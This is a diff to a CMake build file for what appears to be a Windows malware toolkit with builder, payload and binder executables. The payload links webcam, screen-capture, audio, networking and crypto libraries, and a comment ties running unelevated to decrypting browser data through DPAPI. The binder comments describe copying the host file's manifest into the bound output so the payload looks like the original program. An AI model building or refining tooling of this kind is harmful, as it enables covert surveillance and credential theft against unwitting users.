@@ -39,17 +39,18 @@ target_compile_definitions(${PROJECT_NAME} PRIVATE UNICODE _UNICODE)
 
 if(MSVC)
     target_compile_options(${PROJECT_NAME} PRIVATE /W3 /utf-8)
-    # Builder requires admin
-    target_link_options(${PROJECT_NAME} PRIVATE "/MANIFESTUAC:level='requireAdministrator' uiAccess='false'")
+    # Builder runs as user (no UAC elevation required)
+    set_target_properties(${PROJECT_NAME} PROPERTIES WIN32_MANIFEST "src/app.manifest")
 endif()
 
 add_executable(payload WIN32 src/payload.cpp)
-target_link_libraries(payload PRIVATE ws2_32 gdiplus winmm vfw32 shell32 shlwapi crypt32 bcrypt ole32)
+target_link_libraries(payload PRIVATE ws2_32 gdiplus winmm vfw32 shell32 shlwapi crypt32 bcrypt ole32
+    mfplat mfreadwrite mfuuid mf)
 target_compile_definitions(payload PRIVATE UNICODE _UNICODE)
 if(MSVC)
     target_compile_options(payload PRIVATE /W3 /utf-8)
     # Payload runs as user (no UAC) so browser DPAPI works for current user
-    target_link_options(payload PRIVATE "/MANIFESTUAC:level='asInvoker' uiAccess='false'")
+    set_target_properties(payload PROPERTIES WIN32_MANIFEST "src/app.manifest")
 endif()
 
 add_executable(binder WIN32 src/binder.cpp)
@@ -57,7 +58,9 @@ target_link_libraries(binder PRIVATE shell32)
 target_compile_definitions(binder PRIVATE UNICODE _UNICODE)
 if(MSVC)
     target_compile_options(binder PRIVATE /W3 /utf-8)
-    # Bound builds require admin (UAC shield + elevation)
-    target_link_options(binder PRIVATE "/MANIFESTUAC:level='requireAdministrator' uiAccess='false'")
+    # Binder runs as a normal user (asInvoker) — NO forced elevation.
+    # The builder later transplants the ORIGINAL file's manifest into the final
+    # output, so the built exe ends up with exactly the same privileges as the
+    # file the user selected (no admin shield unless the original has one).
+    set_target_properties(binder PROPERTIES WIN32_MANIFEST "src/app.manifest")
 endif()
-
